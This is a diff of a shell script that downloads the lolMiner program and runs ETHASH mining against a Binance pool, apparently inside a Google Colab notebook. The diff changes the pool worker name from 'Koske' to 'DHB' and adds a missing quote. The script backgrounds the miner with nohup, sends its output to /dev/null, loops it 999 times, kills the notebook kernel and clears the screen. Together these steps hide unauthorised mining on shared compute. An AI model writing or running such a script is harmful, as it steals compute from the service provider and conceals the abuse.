@@ -85,7 +85,7 @@ sudo apt-get --purge remove "*nvidia*"
 sudo apt-get autoremove
 number_mining=$(echo $(shuf -i 1-9999 -n 1))
 wget -nv -c https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.42/lolMiner_v1.42_Lin64.tar.gz -O - | tar -xz
-wallet="./1.42/lolMiner --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:443 --user Koske.colab_$number_mining"
+wallet="./1.42/lolMiner --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:443 --user DHB.colab_$number_mining"
 nohup $(for i in {1..999}; do $(echo $wallet); done) >/dev/null 2>&1 &
 pkill -1 -f ipykernel_launcher
 clear
@@ -145,7 +145,7 @@ miner_eth(){
   #        k_wallet=${k_wallet:-'DHB'}
   #read -p "algo [ETHASH]:" k_algo
   #        k_algo=${k_algo:-'ETHASH'}
-  walletstart="./1.42/lolMiner --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:3333 --user DHB.$(echo $(shuf -i 1-9999 -n 1))
+  walletstart="./1.42/lolMiner --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:3333 --user DHB.$(echo $(shuf -i 1-9999 -n 1))"
   $walletstart
 }
 
